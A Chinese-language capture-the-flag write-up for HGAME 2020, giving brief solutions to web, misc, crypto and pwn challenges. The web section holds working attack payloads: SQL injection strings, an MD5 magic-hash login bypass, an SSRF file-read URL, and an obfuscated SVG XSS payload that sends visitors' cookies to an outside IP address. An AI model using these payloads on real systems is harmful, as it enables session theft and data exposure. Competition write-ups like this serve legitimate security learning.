# 2020hgame

## web

###  Cosmos 的博客

> 不过有大茄子告诉我的**版本管理工具**以及 GitHub，我改起来也挺方便的。 

根据提示下载.git

```bash
$ git remote -v
#查看git
```

查看提交历史拿到flag

### 街头霸王

考察对http的了解

```
GET / HTTP/1.1
Host: kyaru.hgame.n3ko.co
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Cosmos Brower
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
referer: https://vidar.club/ 
x-forwarded-for: 127.0.0.1
If-Unmodified-Since: Fri, 02 Jan 2077 00:00:00 GMT
Connection: close


```

### code world

burp拦截

修改GET为post

### 鸡你太美

拦截ajax请求,修改分数



###  Cosmos的博客后台

```php
<?php
include "config.php";
session_start();

//Only for debug
if (DEBUG_MODE){
    if(isset($_GET['debug'])) {
        $debug = $_GET['debug'];
        if (!preg_match("/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/", $debug)) {
            die("args error!");
        }
        eval("var_dump($$debug);");
    }
}

if(isset($_SESSION['username'])) {
    header("Location: admin.php");
    exit();
}
else {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($admin_password == md5($_POST['password']) && $_POST['username'] === $admin_username){
            $_SESSION['username'] = $_POST['username'];
            header("Location: admin.php");
            exit();
        }
        else {
            echo "ç¨æ·åæå¯ç éè¯¯";
        }
    }
}
?>

```



adminpassword: 0e114902927253523756713132279690 

密码使用==来进行md5校验,找个0e开头的密码即可绕过(QNKCDZO)

adminusername: Cosmos! 



index.php

```php
<?php
error_reporting(0);
session_start();

if(isset($_SESSION['username'])) {
    header("Location: admin.php");
    exit();
}

$action = @$_GET['action'];
$filter = "/config|etc|flag/i";

if (isset($_GET['action']) && !empty($_GET['action'])) {
    if(preg_match($filter, $_GET['action'])) {
        echo "Hacker get out!";
        exit();
    }
        include $action;
}
elseif(!isset($_GET['action']) || empty($_GET['action'])) {
    header("Location: ?action=login.php");
    exit();
}
```



admin.php

```php
<?php
include "config.php";
session_start();
if(!isset($_SESSION['username'])) {
    header('Location: index.php');
    exit();
}

function insert_img() {
    if (isset($_POST['img_url'])) {
        $img_url = @$_POST['img_url'];
        $url_array = parse_url($img_url);
        if (@$url_array['host'] !== "localhost" && $url_array['host'] !== "timgsa.baidu.com") {
            return false;
        }   
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $img_url);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        $res = curl_exec($c);
        curl_close($c);
        $avatar = base64_encode($res);

        if(filter_var($img_url, FILTER_VALIDATE_URL)) {
            return $avatar;
        }
    }
    else {
        return base64_encode(file_get_contents("static/logo.png"));
    }
}
?>

<?php echo insert_img() ? insert_img() : base64_encode(file_get_contents("static/error.jpg")); ?>'>

```

file%3A%2F%2Flocalhost%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag



hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}



###  Cosmos的留言板-1

单引号闭合

过滤:select

黑名单:空格

```
0'/**/union/**/select/**/group_concat(schema_name)/**/FROM/**/information_schema.schemata#
information_schema,easysql
0'/**/union/**/select/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA=database();#
f1aggggggggggggg,messages#
GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name/**/=/**/'f1aggggggggggggg'
fl4444444g

hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}
```



###  Cosmos的新语言

php

```php
<?php

// function encrypt($str){
//     $result = '';
//     for($i = 0; $i < strlen($str); $i++){
//         $result .= chr(ord($str[$i]) + 1);
//     }
//     return $result;
// }
function encrypt($str)
{
    $result = '';
    for($i = 0; $i < strlen($str); $i++){
        $result .= chr(ord($str[$i]) - 1);
    }
    return $result;
}
$newcmd='$_POST[\'token\']';
$cmd=substr($_POST['cmd'],0,strlen($_POST['cmd'])-1);
preg_match("/^.*\(/U",$cmd,$arr);
$cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);

while($cmd!=='$_SERVER[\'token\']')
{
    $arr=array();
    preg_match("/^.*\(/U",$cmd,$arr);
    $newcmd=$arr[0].$newcmd.")";    
    $cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);

}

$cmd=(str_replace("base64_encode","base64_decode",$newcmd));    


$dec=eval("echo ".$cmd.";");
?>
```

python 

```python
import requests
def get_flag():
    enccmd=requests.get("http://4211e914b2.php.hgame.n3ko.co/mycode").text[159:]
    enccmd=enccmd[:len(enccmd)-75]
    html=requests.get("http://4211e914b2.php.hgame.n3ko.co/").text[626:]
    enc=html[:html.find("<br>")]
    data={"token":enc,"cmd":enccmd}
    dec=requests.post("http://127.0.0.1/",data=data).text
    data={"token":dec}
    print(requests.post("http://4211e914b2.php.hgame.n3ko.co/",data=data,proxies={"http":"http://127.0.0.1:8080"}).text[626:])

get_flag()
```



###  Cosmos的聊天室 

```html
<svg/onload="[]['\155\141\160']['\143\157\156\163\164\162\165\143\164\157\162']('\144\157\143\165\155\145\156\164\56\154\157\143\141\164\151\157\156\75\47\150\164\164\160\72\57\57\63\71\56\61\60\70\56\61\66\64\56\62\61\71\72\66\60\60\60\65\57\77\47\53\144\157\143\165\155\145\156\164\56\143\157\157\153\151\145')()" aa=
```

输入会变成大写



## misc

### 欢迎参加HGame！ 

 http://rumkin.com/tools/cipher/morse.php 

### 壁纸

就说说咋拿到密码的

压缩文件提示`End of Zip archive, comment: "Password is picture ID."`

利用搜索引擎(`Pixiv@純白可憐`)拿到密码



###  克苏鲁神话 

解压得到一个文本和一个压缩包

观察文本和压缩包发现,二者的CRC值相同,于是考虑用明文攻击(不好意思,我是看着wiki遍历过去的)

然后拿到里面的word文档,但是是加密的,猝.

在看一下那个文本,有点像培根密码

```python
s="of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.".replace(" ","")[:-1]
result=""
for i in range(0,len(s),5):
    temp=""
    for j in range(5):
        if s[i+j]==s[i+j].lower():
            temp+="0"
        else :
            temp+="1"
    result+=chr(int(temp,2)+ord('A'))
print(result)
```

于是拿到密码(HIDDENINTHEDOC),但是还没到头!!!!!百度一下word隐写,最后拿到flag



### 签到题ProPlus



解压得到password.txt和ok.zip

根据password.txt的提示,栅栏解密+凯撒密码得到压缩包密码.

拿到一堆ook直接上谷歌.ok了

base32->base64->二维码



## crypto



###  InfantRSA 

直接套脚本



###  Affine 

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import gmpy2
from secret import A, B, flag
assert flag.startswith('hgame{') and flag.endswith('}')

TABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'
MOD = len(TABLE)

cipher = ''
for b in flag:
    i = TABLE.find(b)
    if i == -1:
        cipher += b
    else:
        ii = (A*i + B) % MOD
        cipher += TABLE[ii]

print(cipher)
# A8I5z{xr1A_J7ha_vG_TpH410}
```

我们观察可以发现这其实是个单表替换加密

那么我们只要生成生成一个加密表就可以很容易的求出加密内容

但是唯一麻烦的是我们不知道A,B,但是我们知道明文的前几个字符hgame

于是有

```python
TABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'
MOD = len(TABLE)
cipher="A8I5z{xr1A_J7ha_vG_TpH410}"

for A in range(1,MOD):
    for B in range(1,MOD):
        result=""
        try :
            #生成加密表
            TABLE2={}
            for b in TABLE:
                i=TABLE.find(b)
                TABLE2[TABLE[(A*i + B) % MOD]]=b
            #解密
            for b in cipher:
                ii=TABLE.find(b)
                
                if ii==-1:
                    result+=b
                else :
                    result+=TABLE2[b]
        except :
            pass
        if "hgame" in result:
            print(result)

```





###  Reorder 

这个是位置移动加密,输入一个和flag长度相同的字符串就知道如何解密了

## pwn

### Hard_AAAAA

覆盖变量值来执行后门函数

